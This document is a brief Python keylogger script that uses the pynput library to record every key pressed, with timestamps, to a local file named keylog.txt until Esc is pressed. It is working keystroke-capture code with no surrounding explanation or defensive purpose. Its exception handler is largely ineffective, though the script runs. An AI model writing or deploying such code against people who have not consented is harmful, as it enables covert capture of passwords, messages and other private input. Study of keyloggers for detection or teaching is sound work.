import pynput
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info("Special key {0} pressed: ".format(key))

# Function to handle key release
def on_release(key):
    if key == Key.esc:
        return False # Stop the listener

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()